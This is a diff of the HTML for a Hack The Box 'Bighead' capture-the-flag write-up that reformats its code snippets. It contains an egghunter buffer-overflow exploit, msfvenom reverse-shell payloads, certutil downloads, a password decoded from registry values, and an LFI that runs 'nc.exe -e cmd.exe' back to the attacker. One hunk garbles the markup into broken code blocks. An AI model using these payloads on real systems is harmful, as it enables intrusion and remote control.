@@ -208,9 +208,10 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <br> Let’s check if there are any other subdomains. I used <code class="highlighter-rouge">wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener noreferrer">subdomains-top1mil-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">seclists</a>:
 <code class="highlighter-rouge">wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112</code>
 <img src="/images/hackthebox/bighead/24.png" alt="">
-<br> non-valid subdomain responses are <code class="highlighter-rouge">11232</code> chars so we will remove those from the output :
-<code class="highlighter-rouge">wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112</code>
-<img src="/images/hackthebox/bighead/25.png" alt="">
+<br> non-valid subdomain responses are <code class="highlighter-rouge">11232</code> chars so we will remove those from the output :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/25.png" alt="">
 <br> We got 3 subdomains : <code class="highlighter-rouge">dev</code>, <code class="highlighter-rouge">mailer</code> and <code class="highlighter-rouge">code</code>. We already know about <code class="highlighter-rouge">mailer</code>, let’s add <code class="highlighter-rouge">dev</code> and <code class="highlighter-rouge">code</code> :
 <img src="/images/hackthebox/bighead/26.png" alt="">
 <br> <code class="highlighter-rouge">code.bighead.htb</code> redirected the browser to <code class="highlighter-rouge">127.0.0.1:5080/testlink/login.php</code>
@@ -264,9 +265,10 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <br> It responds with another <code class="highlighter-rouge">302</code>
 <img src="/images/hackthebox/bighead/35.png" alt="">
 <br> So it will keep redirecting us in a loop and we won’t get anything.
-<br> At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with <code class="highlighter-rouge">wfuzz</code> instead of <code class="highlighter-rouge">gobuster</code> and I got one more result :
-<code class="highlighter-rouge">wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ</code>
-<img src="/images/hackthebox/bighead/36.png" alt="">
+<br> At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with <code class="highlighter-rouge">wfuzz</code> instead of <code class="highlighter-rouge">gobuster</code> and I got one more result :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/36.png" alt="">
 <br> The reason why <code class="highlighter-rouge">gobuster</code> didn’t show us this page is because of the status code. <code class="highlighter-rouge">gobuster</code> only showed results with these status codes : <code class="highlighter-rouge">[+] Status codes : 200,204,301,302,307,403</code>, While <code class="highlighter-rouge">wfuzz</code> showed everything except <code class="highlighter-rouge">404</code> responses, <code class="highlighter-rouge">--hc 404</code>. <code class="highlighter-rouge">/coffee</code> gave a response of <code class="highlighter-rouge">418</code> which is weird. I looked it up and found some info about it <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418" target="_blank" rel="noopener noreferrer">here</a>. <code class="highlighter-rouge">418 I'm a teapot</code> ! Anyway let’s take a look :
 <code class="highlighter-rouge">http://dev.bighead.htb/coffee</code>
 <img src="/images/hackthebox/bighead/37.png" alt="">
@@ -327,15 +329,18 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 <br>
 <img src="/images/hackthebox/bighead/57.png" alt="">
 <br> And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example <code class="highlighter-rouge">R1ck</code> that egg is doubled and added before the shellcode like this : <code class="highlighter-rouge">R1ckR1ck + shellcode</code>. It’s explained very well in skape’s paper <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank" rel="noopener noreferrer">Safely Searching Process Virtual Address Space</a>. There are also many practical tutorials just search for win32 egghunting. 
-<br> Now back to the vulnerable server, first thing we need to know is the offset. I’m using <a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer">mona plugin</a>. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener noreferrer">Documentation</a>
-<br> <code class="highlighter-rouge">!mona config -set workingfolder c:\logs\%p</code>, to make <code class="highlighter-rouge">mona</code> output to <code class="highlighter-rouge">C:\logs</code>
-<img src="/images/hackthebox/bighead/58.png" alt="">
+<br> Now back to the vulnerable server, first thing we need to know is the offset. I’m using <a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer">mona plugin</a>. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener noreferrer">Documentation</a>.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!mona config -set workingfolder c:\logs\%p`, to make `mona` output to `C:\logs
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/58.png" alt="">
 <br> To find the offset we will create a pattern <code class="highlighter-rouge">!mona pc 100</code> (creates a pattern of 100 chars), this is the same as <code class="highlighter-rouge">pattern_create.rb</code> from <code class="highlighter-rouge">metasploit</code>. I used it in my <a href="/categories/#binary-exploitation">buffer overflow write-ups</a>.
 <img src="/images/hackthebox/bighead/59.png" alt="">
 <br> It will put the output in a file called <code class="highlighter-rouge">pattern.txt</code> in <code class="highlighter-rouge">C:\logs</code> :
 <img src="/images/hackthebox/bighead/60.png" alt="">
-<br> Pattern : <code class="highlighter-rouge">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</code>
-<img src="/images/hackthebox/bighead/61.png" alt="">
+<br> Pattern :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/61.png" alt="">
 <br> Full output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>================================================================================
   Output generated by mona.py v2.0, rev 585 - Immunity Debugger
@@ -442,9 +447,10 @@ JAVASCRIPT (unescape() friendly):
 import binascii
 import re
 </code></pre></div></div>
-<p><br> Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :
-<code class="highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python</code>
-<img src="/images/hackthebox/bighead/76.png" alt="">
+<p><br> Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/76.png" alt="">
 <br> <code class="highlighter-rouge">-b '\x00'</code> is for bad chars. <code class="highlighter-rouge">\x00</code> which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove <code class="highlighter-rouge">\x</code> because we will use <code class="highlighter-rouge">hexlify</code> and <code class="highlighter-rouge">unhexlify</code> functions from <code class="highlighter-rouge">binascii</code>. This is for the shellcode, now we need the egghunter. I used this <a href="https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py" target="_blank" rel="noopener noreferrer">tool</a> to generate the egghunter :
 <img src="/images/hackthebox/bighead/77.png" alt="">
 <br> But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :
@@ -492,11 +498,13 @@ egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8b
 <p><img src="/images/hackthebox/bighead/79.png" alt="">
 <br> Note : there’s a variable called <code class="highlighter-rouge">N</code>, that will come later and it has nothing to do with the exploit itself.
 <br> Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter. 
-<br> We will start by defining the function :
-<code class="highlighter-rouge">def send_shellcode(N,host,port,egg,shellcode):</code>
-<br> Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :
-<code class="highlighter-rouge">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)</code>
-<br> Last thing to do is to send the POST request with the shellcode :</p>
+<br> We will start by defining the function :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def send_shellcode(N,host,port,egg,shellcode):
+</code></pre></div></div>
+<p><br> Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+</code></pre></div></div>
+<p><br> Last thing to do is to send the POST request with the shellcode :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s.send("POST / HTTP/1.1\r\n")
 s.send("Host: dev.bighead.htb\r\n")
 s.send("Content-Length: %s\r\n"%len(shellcode))
@@ -504,8 +512,7 @@ s.send("\r\n")
 s.send(shellcode+"\r\n")
 s.send("\r\n")
 </code></pre></div></div>
-<p><br> Then we will close the stream :
-<code class="highlighter-rouge">s.close()</code>
+<p><br> Then we will close the stream : <code class="highlighter-rouge">s.close()</code>
 <br> I added this in a <code class="highlighter-rouge">for</code> loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : <code class="highlighter-rouge">print "\033[32m [*] Sending Shellcode"</code>, <code class="highlighter-rouge">\033[32m</code> is for the color it’s not important for the exploit. And I added a print statement before closing the stream : <code class="highlighter-rouge">print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))</code>. <code class="highlighter-rouge">re.sub(r"\s"," ",s.recv(12))</code> This will use <code class="highlighter-rouge">re</code> (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).
 <code class="highlighter-rouge">send_shellcode</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def send_shellcode(N,host,port,egg,shellcode):
@@ -527,9 +534,10 @@ s.send("\r\n")
 <p><img src="/images/hackthebox/bighead/80.png" alt="">
 <br> That’s for <code class="highlighter-rouge">send_shellcode</code>, let’s write <code class="highlighter-rouge">send_egghunter</code>. We will define the function first :
 <code class="highlighter-rouge">def send_egghunter(host,port,egghunter):</code>
-<br> Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :
-<code class="highlighter-rouge">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)</code>
-<br> Then we will connect and send the HEAD request :</p>
+<br> Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="highlighter-rouge">s</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
+</code></pre></div></div>
+<p><br> Then we will connect and send the HEAD request :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s.connect((host,port))
 s.settimeout(None)
 s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
@@ -651,9 +659,10 @@ send_egghunter(host,port,egghunter)
 <img src="/images/hackthebox/bighead/88.png" alt="">
 <br> So we probably we need to be <code class="highlighter-rouge">nginx</code> to get the user flag. And of course we can’t access <code class="highlighter-rouge">nginx</code> directory :
 <img src="/images/hackthebox/bighead/89.png" alt="">
-<br> I wanted to upgrade that reverse shell into <code class="highlighter-rouge">meterpreter</code> so I had to create the payload first :
-<code class="highlighter-rouge">msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &gt; m.exe</code>
-<img src="/images/hackthebox/bighead/90.png" alt="">
+<br> I wanted to upgrade that reverse shell into <code class="highlighter-rouge">meterpreter</code> so I had to create the payload first :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &gt; m.exe
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/90.png" alt="">
 <br> Then I set up the <code class="highlighter-rouge">meterpreter</code> handler :
 <img src="/images/hackthebox/bighead/91.png" alt="">
 <br> I ran a python simple http server on port 80 : <code class="highlighter-rouge">python -m SimpleHTTPServer 80</code> to host the payload. Then I went to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and downloaded the payload with <code class="highlighter-rouge">certutil</code> :
@@ -668,108 +677,60 @@ send_egghunter(host,port,egghunter)
 <img src="/images/hackthebox/bighead/95.png" alt="">
 <br> I wanted to know the listening port of that ssh server, so I did <code class="highlighter-rouge">netstat</code>. It was listening on port 2020 :
 <img src="/images/hackthebox/bighead/96.png" alt="">
-<br> So I forwarded that port, We also saw earlier when we went to <code class="highlighter-rouge">code.bighead.htb</code> it redirected us to <code class="highlighter-rouge">http://127.0.0.1:5080/testlink/login.php</code>. I wanted to forward that port too to check what’s in there. To forward a port through <code class="highlighter-rouge">meterpreter</code> we can simply do it with <code class="highlighter-rouge">portfwd</code> :
-<code class="highlighter-rouge">portfwd add -l 2020 -p 2020 -r bighead.htb</code>
-<br>
-<code class="highlighter-rouge">portfwd add -l 5080 -p 5080 -r bighead.htb</code>
-<br>
-<img src="/images/hackthebox/bighead/97.png" alt="">
-<br> Let’s check if that <code class="highlighter-rouge">BvSshServer</code> is a real ssh server :
-<img src="/images/hackthebox/bighead/98.png" alt="">
-<br> It’s working fine, now we need a password to login. We already know the username : <code class="highlighter-rouge">nginx</code>.
-<br> I went to <code class="highlighter-rouge">code.bighead.htb</code> again and after I got redirected to port 5080 on <code class="highlighter-rouge">localhost</code> I got some <code class="highlighter-rouge">SQL</code> errors :
-<img src="/images/hackthebox/bighead/99.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/bighead/100.png" alt="">
-<br> As you can see it disclosed the root path  of the application : <code class="highlighter-rouge">C:\xampp</code>. I tried to go there but I got access denied :
-<img src="/images/hackthebox/bighead/101.png" alt="">
-<br> After a lot of enumeration I checked the <code class="highlighter-rouge">registry</code> and in <code class="highlighter-rouge">HKLM\System\CurrentControlSet\Services\</code> I found the <code class="highlighter-rouge">registry</code> for <code class="highlighter-rouge">nignx</code> (The web server) :
-<code class="highlighter-rouge">reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'</code>
-<img src="/images/hackthebox/bighead/102.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/bighead/103.png" alt="">
-<br> Then I looked at the values and I found two interesting ones :
-<code class="highlighter-rouge">reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx</code>
-<img src="/images/hackthebox/bighead/104.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg enumkey -k 'HKLM\System\CurrentControlSet\Services\nginx'
-Enumerating: HKLM\System\CurrentControlSet\Services\nginx
-
-  Keys (2):
-
-        Parameters
-        Enum
-
-  Values (12):
-
-        Type
-        Start
-        ErrorControl
-        ImagePath
-        DisplayName
-        ObjectName
-        Description
-        DelayedAutostart
-        FailureActionsOnNonCrashFailures
-        FailureActions
-        Authenticate
-        PasswordHash
+<br> So I forwarded that port, We also saw earlier when we went to <code class="highlighter-rouge">code.bighead.htb</code> it redirected us to :
+`
+http://127.0.0.1:5080/testlink/login.php</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br&gt;I wanted to forward that port too to check what's in there. To forward a port through `meterpreter` we can simply do it with `portfwd` :
+`portfwd add -l 2020 -p 2020 -r bighead.htb`
+&lt;br&gt;
+`portfwd add -l 5080 -p 5080 -r bighead.htb`
+&lt;br&gt;
+![](/images/hackthebox/bighead/97.png)
+&lt;br&gt; Let's check if that `BvSshServer` is a real ssh server :
+![](/images/hackthebox/bighead/98.png)
+&lt;br&gt; It's working fine, now we need a password to login. We already know the username : `nginx`.
+&lt;br&gt; I went to `code.bighead.htb` again and after I got redirected to port 5080 on `localhost` I got some `SQL` errors :
+![](/images/hackthebox/bighead/99.png)
+&lt;br&gt;
+&lt;br&gt;
+![](/images/hackthebox/bighead/100.png)
+&lt;br&gt; As you can see it disclosed the root path  of the application : `C:\xampp`. I tried to go there but I got access denied :
+![](/images/hackthebox/bighead/101.png)
+&lt;br&gt; After a lot of enumeration I checked the `registry` and in `HKLM\System\CurrentControlSet\Services\` I found the `registry` for `nignx` (The web server) :
+`reg enumkey -k 'HKLM\System\CurrentControlSet\Services\'`
+![](/images/hackthebox/bighead/102.png)
+&lt;br&gt;
+&lt;br&gt;
+![](/images/hackthebox/bighead/103.png)
+&lt;br&gt; Then I looked at the values and I found two interesting ones :
 </code></pre></div></div>
-<p><br> <code class="highlighter-rouge">Authenticate</code> and <code class="highlighter-rouge">PasswordHash</code>. Let’s look at the value :
-<br> <code class="highlighter-rouge">Authenticate</code> :
-<code class="highlighter-rouge">reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate</code>
-<img src="/images/hackthebox/bighead/105.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate
-Key: HKLM\System\CurrentControlSet\Services\nginx
-Name: Authenticate
-Type: REG_BINARY
-Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000
+<p>reg enumkey -k ‘HKLM\System\CurrentControlSet\Services\nginx</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>![](/images/hackthebox/bighead/104.png)
 </code></pre></div></div>
-<p><br> <code class="highlighter-rouge">PasswordHash</code> :
-<code class="highlighter-rouge">reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash</code>
-<img src="/images/hackthebox/bighead/106.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash
-Key: HKLM\System\CurrentControlSet\Services\nginx
-Name: PasswordHash
-Type: REG_SZ
-Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a
+<p>meterpreter &gt; reg enumkey -k ‘HKLM\System\CurrentControlSet\Services\nginx’
+Enumerating: HKLM\System\CurrentControlSet\Services\nginx</p>
+
+<p>Keys (2):</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Parameters
+    Enum
 </code></pre></div></div>
-<p><br> <code class="highlighter-rouge">Authenticate</code> : <code class="highlighter-rouge">4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000</code>
-<br> <code class="highlighter-rouge">PasswordHash</code> : <code class="highlighter-rouge">336d72676e6333205361797a205472794861726465722e2e2e203b440a</code>
-<br> Looks like <code class="highlighter-rouge">hex</code>, Let’s see <code class="highlighter-rouge">Authenticate</code> : 
-<img src="/images/hackthebox/bighead/107.png" alt="">
-<br> The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :
-<code class="highlighter-rouge">4837334270555932557139552d5975677974354659556259302d553837743837</code>
-<img src="/images/hackthebox/bighead/108.png" alt="">
-<br> So this might be a password : <code class="highlighter-rouge">H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code>, Let’s check <code class="highlighter-rouge">PasswordHash</code> :
-<img src="/images/hackthebox/bighead/109.png" alt="">
-<br> <code class="highlighter-rouge">3mrgnc3 sayz TryHarder... ;D</code>, It was just a troll. Anyway we have a password let’s try to login to ssh as <code class="highlighter-rouge">nignx</code> :
-<img src="/images/hackthebox/bighead/110.png" alt="">
-<br> It worked, and by looking at the files I figured out that we are in <code class="highlighter-rouge">C:\xampp</code> :
-<img src="/images/hackthebox/bighead/111.png" alt="">
-<br> There was also a <code class="highlighter-rouge">user.txt</code>, I tried to read it but it said that it was a binary file :
-<img src="/images/hackthebox/bighead/112.png" alt="">
-<br> I wanted to check the user but <code class="highlighter-rouge">whoami</code> wasn’t there :
-<img src="/images/hackthebox/bighead/113.png" alt="">
-<br> So I checked <code class="highlighter-rouge">help</code> and this shell has only some basic commands :
-<img src="/images/hackthebox/bighead/114.png" alt="">
-<br> I know that I’m inside <code class="highlighter-rouge">C:\xampp</code> now. But what am I searching for anyway ? I went back to the <code class="highlighter-rouge">meterpreter</code> shell and checked the access log of <code class="highlighter-rouge">nginx</code> in <code class="highlighter-rouge">C:\nginx\logs</code> :
-<img src="/images/hackthebox/bighead/115.png" alt="">
-<br> At the beginning of the log I found some requests with the <code class="highlighter-rouge">user-agent</code> <code class="highlighter-rouge">3mrgnc3</code> :
-<img src="/images/hackthebox/bighead/116.png" alt="">
-<br> Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to <code class="highlighter-rouge">/testlink</code>. Because everything we have access to on port 5080 is under <code class="highlighter-rouge">/testlink</code>.
-<br> On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to <code class="highlighter-rouge">/testlink/linkto.php</code> :
-<img src="/images/hackthebox/bighead/117.png" alt="">
-<br> I went to that path and got an error which disclosed the path of the <code class="highlighter-rouge">php</code> file :
-<img src="/images/hackthebox/bighead/118.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
+
+<p>Values (12):</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Type
+    Start
+    ErrorControl
+    ImagePath
+    DisplayName
+    ObjectName
+    Description
+    DelayedAutostart
+    FailureActionsOnNonCrashFailures
+    FailureActions
+    Authenticate
+    PasswordHash ``` &lt;br&gt; `Authenticate` and `PasswordHash`. Let's look at the value : &lt;br&gt; `Authenticate` : ``` reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate ``` ![](/images/hackthebox/bighead/105.png) ``` meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v Authenticate Key: HKLM\System\CurrentControlSet\Services\nginx Name: Authenticate Type: REG_BINARY Data: 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000 ``` &lt;br&gt; `PasswordHash` : ``` reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash ``` ![](/images/hackthebox/bighead/106.png) ``` meterpreter &gt; reg queryval -k 'HKLM\System\CurrentControlSet\Services\nginx' -v PasswordHash Key: HKLM\System\CurrentControlSet\Services\nginx Name: PasswordHash Type: REG_SZ Data: 336d72676e6333205361797a205472794861726465722e2e2e203b440a ``` &lt;br&gt; `Authenticate` : ``` 4800370033004200700055005900320055007100390055002d005900750067007900740035004600590055006200590030002d0055003800370074003800370000000000 ``` &lt;br&gt; `PasswordHash` :  ``` 336d72676e6333205361797a205472794861726465722e2e2e203b440a ``` &lt;br&gt; Looks like `hex`, Let's see `Authenticate` :  ![](/images/hackthebox/bighead/107.png) &lt;br&gt; The output was kinda weird, that's because of the null bytes, I removed them then I got the right output : ``` 4837334270555932557139552d5975677974354659556259302d553837743837 ``` ![](/images/hackthebox/bighead/108.png) &lt;br&gt; So this might be a password : `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`, Let's check `PasswordHash` : ![](/images/hackthebox/bighead/109.png) &lt;br&gt; `3mrgnc3 sayz TryHarder... ;D`, It was just a troll. Anyway we have a password let's try to login to ssh as `nignx` : ![](/images/hackthebox/bighead/110.png) &lt;br&gt; It worked, and by looking at the files I figured out that we are in `C:\xampp` : ![](/images/hackthebox/bighead/111.png) &lt;br&gt; There was also a `user.txt`, I tried to read it but it said that it was a binary file : ![](/images/hackthebox/bighead/112.png) &lt;br&gt; I wanted to check the user but `whoami` wasn't there : ![](/images/hackthebox/bighead/113.png) &lt;br&gt; So I checked `help` and this shell has only some basic commands : ![](/images/hackthebox/bighead/114.png) &lt;br&gt; I know that I'm inside `C:\xampp` now. But what am I searching for anyway ? I went back to the `meterpreter` shell and checked the access log of `nginx` in `C:\nginx\logs` : ![](/images/hackthebox/bighead/115.png) &lt;br&gt; At the beginning of the log I found some requests with the `user-agent` `3mrgnc3` : ![](/images/hackthebox/bighead/116.png) &lt;br&gt; Most of them are HEAD requests, maybe he was testing the buffer overflow I don't really know but anyway we are not looking for that. We are looking for requests to `/testlink`. Because everything we have access to on port 5080 is under `/testlink`. &lt;br&gt; On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to `/testlink/linkto.php` : ![](/images/hackthebox/bighead/117.png) &lt;br&gt; I went to that path and got an error which disclosed the path of the `php` file : ![](/images/hackthebox/bighead/118.png) ``` Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62 ``` &lt;br&gt; The path was `C:\xampp\apps\testlink\htdocs\linkto.php` So I went there and got the `php` file : ![](/images/hackthebox/bighead/119.png) &lt;br&gt; &lt;br&gt; ![](/images/hackthebox/bighead/120.png)
 </code></pre></div></div>
-<p><br> The path was <code class="highlighter-rouge">C:\xampp\apps\testlink\htdocs\linkto.php</code> So I went there and got the <code class="highlighter-rouge">php</code> file :
-<img src="/images/hackthebox/bighead/119.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/bighead/120.png" alt=""></p>
 <hr>
 
 <h2 id="lfi-in-linktophp-user-flag">LFI in <code class="highlighter-rouge">linkto.php</code>, User Flag</h2>
@@ -803,9 +764,16 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 </code></pre></div></div>
 <p><br> I uploaded it and uploaded <code class="highlighter-rouge">nc.exe</code> to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp\</code> :
 <img src="/images/hackthebox/bighead/125.png" alt="">
-<br>  Last step is to exploit the vulnerability. We will send a POST request to <code class="highlighter-rouge">http://code.bighead.htb/testlink/linkto.php</code> With the parameters <code class="highlighter-rouge">PiperID</code> (we can leave it empty) and <code class="highlighter-rouge">PiperCoinID</code> which will be the path of the <code class="highlighter-rouge">php</code> script (<code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp\rev.php</code>) :
-<code class="highlighter-rouge">curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php"</code>
-<img src="/images/hackthebox/bighead/126.png" alt="">
+<br>  Last step is to exploit the vulnerability. We will send a POST request to :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://code.bighead.htb/testlink/linkto.php
+</code></pre></div></div>
+<p><br> With the parameters <code class="highlighter-rouge">PiperID</code> (we can leave it empty) and <code class="highlighter-rouge">PiperCoinID</code> which will be the path of the <code class="highlighter-rouge">php</code> script :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Nelson\AppData\Local\Temp\rev.php
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php"
+</code></pre></div></div>
+<p><img src="/images/hackthebox/bighead/126.png" alt="">
 <br> We get a reverse shell immediately. As <code class="highlighter-rouge">nt authority\system</code> :
 <img src="/images/hackthebox/bighead/127.png" alt="">
 <br> Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :
@@ -838,7 +806,10 @@ system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
 <br>
 <br>
 <img src="/images/hackthebox/bighead/136.png" alt="">
